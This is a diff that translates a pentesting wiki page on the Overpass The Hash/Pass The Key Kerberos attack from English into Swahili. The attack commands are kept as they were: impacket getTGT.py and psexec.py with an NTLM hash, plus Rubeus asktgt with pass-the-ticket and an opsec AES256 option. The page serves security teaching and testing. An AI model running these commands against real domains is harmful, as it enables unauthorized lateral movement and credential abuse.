@@ -8,38 +8,32 @@
 
 ## Overpass The Hash/Pass The Key (PTK)
 
-The **Overpass The Hash/Pass The Key (PTK)** attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network.
+Shambulio la **Overpass The Hash/Pass The Key (PTK)** limetengenezwa kwa mazingira ambapo itifaki ya NTLM ya jadi imezuiliwa, na uthibitishaji wa Kerberos unachukua kipaumbele. Shambulio hili linatumia hash ya NTLM au funguo za AES za mtumiaji ili kuomba tiketi za Kerberos, kuruhusu ufikiaji usioidhinishwa kwa rasilimali ndani ya mtandao.
 
-To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.
+Ili kutekeleza shambulio hili, hatua ya kwanza ni kupata hash ya NTLM au nenosiri la akaunti ya mtumiaji aliyechaguliwa. Baada ya kupata taarifa hii, Tiketi ya Kutoa Tiketi (TGT) kwa akaunti hiyo inaweza kupatikana, ikiruhusu mshambuliaji kufikia huduma au mashine ambazo mtumiaji ana ruhusa.
 
-The process can be initiated with the following commands:
-
+Mchakato unaweza kuanzishwa kwa amri zifuatazo:
 ```bash
 python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
+Kwa hali zinazohitaji AES256, chaguo `-aesKey [AES key]` kinaweza kutumika. Aidha, tiketi iliyopatikana inaweza kutumika na zana mbalimbali, ikiwa ni pamoja na smbexec.py au wmiexec.py, kupanua wigo wa shambulio.
 
-For scenarios necessitating AES256, the `-aesKey [AES key]` option can be utilized. Moreover, the acquired ticket might be employed with various tools, including smbexec.py or wmiexec.py, broadening the scope of the attack.
+Masuala yaliyokutana kama _PyAsn1Error_ au _KDC cannot find the name_ kwa kawaida yanatatuliwa kwa kuboresha maktaba ya Impacket au kutumia jina la mwenyeji badala ya anwani ya IP, kuhakikisha ufanisi na Kerberos KDC.
 
-Encountered issues such as _PyAsn1Error_ or _KDC cannot find the name_ are typically resolved by updating the Impacket library or using the hostname instead of the IP address, ensuring compatibility with the Kerberos KDC.
-
-An alternative command sequence using Rubeus.exe demonstrates another facet of this technique:
-
+Mfuatano wa amri mbadala ukitumia Rubeus.exe unaonyesha uso mwingine wa mbinu hii:
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
+Hii mbinu inafanana na **Pass the Key** njia, ikiwa na mkazo wa kuchukua na kutumia tiketi moja kwa moja kwa madhumuni ya uthibitishaji. Ni muhimu kutambua kwamba kuanzishwa kwa ombi la TGT kunasababisha tukio `4768: A Kerberos authentication ticket (TGT) was requested`, ikionyesha matumizi ya RC4-HMAC kama chaguo la default, ingawa mifumo ya kisasa ya Windows inapendelea AES256.
 
-This method mirrors the **Pass the Key** approach, with a focus on commandeering and utilizing the ticket directly for authentication purposes. It's crucial to note that the initiation of a TGT request triggers event `4768: A Kerberos authentication ticket (TGT) was requested`, signifying an RC4-HMAC usage by default, though modern Windows systems prefer AES256.
-
-To conform to operational security and use AES256, the following command can be applied:
-
+Ili kuzingatia usalama wa operesheni na kutumia AES256, amri ifuatayo inaweza kutumika:
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
-
-## References
+## Marejeo
 
 - [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
@@ -48,4 +42,3 @@ To conform to operational security and use AES256, the following command can be 
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
